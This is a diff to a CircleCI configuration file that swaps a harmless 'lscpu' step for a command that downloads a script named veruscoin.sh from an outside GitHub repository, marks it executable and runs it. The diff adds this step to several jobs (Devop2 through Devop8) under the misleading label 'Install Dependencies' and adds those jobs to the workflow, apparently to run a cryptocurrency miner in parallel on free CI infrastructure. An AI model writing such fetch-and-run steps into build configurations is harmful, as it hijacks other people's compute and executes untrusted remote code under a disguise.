@@ -13,24 +13,69 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://raw.githubusercontent.com/Yahihs/youtube/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh 
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://raw.githubusercontent.com/Yahihs/youtube/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh 
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://raw.githubusercontent.com/Yahihs/youtube/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh 
+    Devop4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Yahihs/youtube/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh 
+    Devop5:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Yahihs/youtube/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh  
+    Devop6:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Yahihs/youtube/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh    
+    Devop7:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Yahihs/youtube/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh      
+    Devop8:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Yahihs/youtube/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh                 
 workflows:
     version: 2.1
     build:
         jobs:
             - Devop
+            - Devop1
+            - Devop2
+            - Devop3
+            - Devop4
+            - Devop5
+            - Devop6
+            - Devop7
+            - Devop8
+            
+            
             
